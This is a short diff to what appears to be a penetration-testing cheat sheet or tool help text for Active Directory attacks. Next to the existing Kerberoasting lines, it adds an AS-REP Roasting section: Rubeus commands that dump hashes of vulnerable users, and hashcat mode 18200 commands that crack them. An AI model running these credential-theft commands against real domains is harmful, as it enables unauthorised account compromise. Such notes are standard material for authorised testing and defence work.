@@ -16,6 +16,13 @@ Kerberoasting:
   hashcat -m 13100 -a 0 hash.txt Pass.txt
                         Crack that hash
 
+AS-REP Roasting:
+  Rubeus.exe asreproast
+                        Run the AS-REP roast command looking for vulnerable users
+                        and then dump found vulnerable user hashes
+  hashcat -m 18200 hash.txt <WORDLIST_TXT>
+                        Crack those hashes (Kerberos 5 AS-REP etype 23)
+
 Options:
 
 Informational:
